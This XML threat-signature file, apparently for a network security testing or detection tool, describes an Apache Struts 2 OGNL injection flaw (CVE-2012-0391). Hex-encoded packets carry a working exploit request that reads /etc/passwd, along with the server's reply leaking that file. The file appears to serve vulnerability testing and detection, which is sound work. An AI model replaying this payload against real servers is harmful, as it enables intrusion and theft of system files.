<?xml version="1.0" encoding="utf-8"?>
<threatSignature>
  <ThreatProperties>
    <ExecDesc display="true" value="Apache Struts 2 ConversionErrorInterceptor OGNL Script Injection"/>
    <EngDesc display="true" value="A script injection vulnerability has been found in Apache Struts 2. The vulnerability is due to a design error: HTTP request parameters are interpreted as OGNL expressions when conversion errors occur.            A remote, unauthenticated attacker can exploit this vulnerability by sending a crafted HTTP request to a vulnerable Struts 2 web application. A successful attack will result in the execution of arbitrary OGNL expressions (possibly OS commands) in the security context of the web application server.&#13;&#10;"/>
    <Intent display="true">
      <item value="Script_Injection"/>
    </Intent>
    <Protocol display="true" value="HTTP,HTTPS"/>
    <Type_Of_Equipment display="true">
      <item value="Application"/>
    </Type_Of_Equipment>
    <Known_Vendors_Affected display="true">
      <item value="Apache_Software_Foundation"/>
    </Known_Vendors_Affected>
    <Known_Products_Affected display="true">
      <item value="Struts_2"/>
    </Known_Products_Affected>
    <Known_Versions_Affected display="true">
      <item value="prior_to_2.2.3.1"/>
    </Known_Versions_Affected>
    <Credit display="true" value="TSL20111209-05"/>
    <CVEID display="true" value="CVE-2012-0391"/>
    <bugtraqID display="true" value=""/>
    <OSVDB display="true" value=""/>
    <Author display="true" value=""/>
    <ID display="true" value="6c195fe6f849fe8ec8ea5a3e373da27e"/>
    <Revision display="true" value="1"/>
    <Safe display="true" value=""/>
    <ServerSideAttack display="true" value=""/>
    <SoftwareRevision display="true" value=""/>
    <Suite display="true" value=""/>
    <RunOnce display="false" value=""/>
    <Valid_Traffic display="false" value=""/>
    <AccessVector display="false" value="Network"/>
    <AccessComplexity display="false" value="Medium"/>
    <Authentication display="false" value="not-required"/>
    <ConfImpact display="false" value="partial"/>
    <IntegImpact display="false" value="partial"/>
    <AvailImpact display="false" value="partial"/>
    <ImpactBias display="false" value=""/>
    <FirstAdded display="false" value=""/>
    <LastModified display="false" value="634656756913130785"/>
    <SigStyle display="false" value=""/>
    <targetNode display="false" value=""/>
    <SigProtocol display="false" value=""/>
    <Rate display="false" value=""/>
    <Regex display="false" value=""/>
    <Created value="1333099838" display="true"/>
  </ThreatProperties>
  <Variables>
    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="E"/>
  </Variables>
  <Loops>
    <for index="A">
      <for index="D"/>
      <for index="E"/>
    </for>
    <for index="B">
      <for index="D"/>
      <for index="E"/>
    </for>
  </Loops>
  <PostScript/>
  <Output index="A" Count="">
    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:41:88:9A" pktType="0800">
      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="012E" Identification="DDED" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="F9BD" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
        <TCP srcPort="60726" destPort="$HTTPdestPort" SeqNumber="FAB03D3B" AckNumber="2D353223" HeaderLength="08" WindowSize="002E" Checksum="2D65" UrgentPointer="0000" Options="0101080A208DE0D220193D41" Payload="474554202F4356455F323031325F303339312F54454C55535F53656375726974795F4C6162732E616374696F6E3F617661726961626C653D2725326228253233633D3A5B253233783D253233746869732E726561644C696E6528292C253233783D3D6E756C6C3F27273A25323378253262272535636E27253262253233632825323374686973295D2C25323363286E65772532306A6176612E696F2E4275666665726564526561646572286E65772532306A6176612E696F2E46696C6552656164657228272F6574632F70617373776427292929292532622720485454502F312E310D0A486F73743A203137322E31362E382E3235320D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
      </IP>
    </Ethernet>
  </Output>
  <Input>
    <Ethernet/>
  </Input>
  <ServerSide display="1">
    <Output index="B" Count="">
      <Ethernet srcMac="00:0C:29:41:88:9A" destMac="00:1B:78:75:79:68" pktType="0800">
        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="05DC" Identification="0F63" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="C39A" srcIP="$destIP" destIP="172.16.1.2" options="" CE="false" DF="true" MF="false">
          <TCP srcPort="$HTTPdestPort" destPort="60726" SeqNumber="2D353223" AckNumber="FAB03E35" HeaderLength="08" WindowSize="0798" Checksum="F37C" UrgentPointer="0000" Options="0101080A20193D65208DE0D2" Payload="485454502F312E3120323030204F4B0D0A446174653A204D6F6E2C203330204A616E20323031322031353A35303A313620474D540D0A436F6E74656E742D547970653A20746578742F68746D6C3B636861727365743D49534F2D383835392D310D0A5365742D436F6F6B69653A204A53455353494F4E49443D316932326630613930616E766C7370683874696F6D7161776B3B506174683D2F4356455F323031325F303339310D0A457870697265733A205468752C203031204A616E20313937302030303A30303A303020474D540D0A436F6E74656E742D4C656E6774683A20313438330D0A5365727665723A204A6574747928382E302E342E763230313131303234290D0A0D0A0A0A3C21444F43545950452068746D6C205055424C494320222D2F2F5733432F2F4454442048544D4C20342E3031205472616E736974696F6E616C2F2F454E222022687474703A2F2F7777772E77332E6F72672F54522F68746D6C342F6C6F6F73652E647464223E0A3C68746D6C3E0A3C686561643E0A3C6D65746120687474702D65717569763D22436F6E74656E742D547970652220636F6E74656E743D22746578742F68746D6C3B20636861727365743D49534F2D383835392D31223E0A3C7469746C653E54454C5553205365637572697479204C616273204356452D323031322D3033393120506F433C2F7469746C653E0A3C2F686561643E0A3C626F64793E0A3C703E48656C6C6F2C2066726F6D2054454C5553205365637572697479204C6162733C2F703E0A3C68323E726F6F743A783A303A303A726F6F743A2F726F6F743A2F62696E2F626173680A6461656D6F6E3A783A313A313A6461656D6F6E3A2F7573722F7362696E3A2F62696E2F73680A62696E3A783A323A323A62696E3A2F62696E3A2F62696E2F73680A7379733A783A333A333A7379733A2F6465763A2F62696E2F73680A73796E633A783A343A36353533343A73796E633A2F62696E3A2F62696E2F73796E630A67616D65733A783A353A36303A67616D65733A2F7573722F67616D65733A2F62696E2F73680A6D616E3A783A363A31323A6D616E3A2F7661722F63616368652F6D616E3A2F62696E2F73680A6C703A783A373A373A6C703A2F7661722F73706F6F6C2F6C70643A2F62696E2F73680A6D61696C3A783A383A383A6D61696C3A2F7661722F6D61696C3A2F62696E2F73680A6E6577733A783A393A393A6E6577733A2F7661722F73706F6F6C2F6E6577733A2F62696E2F73680A757563703A783A31303A31303A757563703A2F7661722F73706F6F6C2F757563703A2F62696E2F73680A70726F78793A783A31333A31333A70726F78793A2F62696E3A2F62696E2F73680A7777772D646174613A783A33333A33333A7777772D646174613A2F7661722F7777773A2F62696E2F73680A6261636B75703A783A33343A33343A6261636B75703A2F7661722F6261636B7570733A2F62696E2F73680A6C6973743A783A33383A33383A4D61696C696E67204C697374204D616E616765723A2F7661722F6C6973743A2F62696E2F73680A6972633A783A33393A33393A697263643A2F7661722F72756E2F697263643A2F62696E2F73680A676E6174733A783A34313A34313A476E617473204275672D5265706F7274696E672053797374656D202861646D696E293A2F7661722F6C69622F676E6174733A2F62696E2F73680A6E6F626F64793A783A36353533343A36353533343A6E6F626F64793A2F6E6F6E6578697374656E743A2F62696E2F73680A6C6962757569643A783A3130303A3130313A3A2F7661722F6C69622F6C6962757569643A2F62696E2F73680A7379736C6F673A783A3130313A3130333A3A2F686F6D652F7379736C6F673A2F62696E2F66616C73650A6D6573736167656275733A783A3130323A3130353A3A2F7661722F72756E2F646275733A2F62696E2F66616C73650A6C616E6473636170653A783A3130333A3130383A3A2F7661722F6C69622F6C616E6473636170653A2F62696E2F66616C73650A737368643A783A3130343A36353533343A3A2F7661722F72756E2F737368643A2F7573722F7362696E2F6E6F6C6F67696E0A626D6F6F72653A783A313030303A313030303A626D6F6F72652C2C2C3A2F686F6D652F626D6F6F72653A2F62696E2F626173680A7672743A783A313030313A313030313A2C2C2C3A2F686F6D652F7672743A2F62696E2F626173680A61766168693A783A3130353A3131333A4176616869206D444E53206461656D6F6E2C2C2C3A2F7661722F72756E2F61766168692D6461656D6F6E3A2F62696E2F66616C73650A706F7374677265733A783A313030323A313030323A3A2F686F6D652F706F7374677265733A2F62696E2F73680A3C2F68323E0A3C2F626F64793E0A3C2F68746D6C3E0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="false" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
        </IP>
      </Ethernet>
    </Output>
  </ServerSide>
</threatSignature>
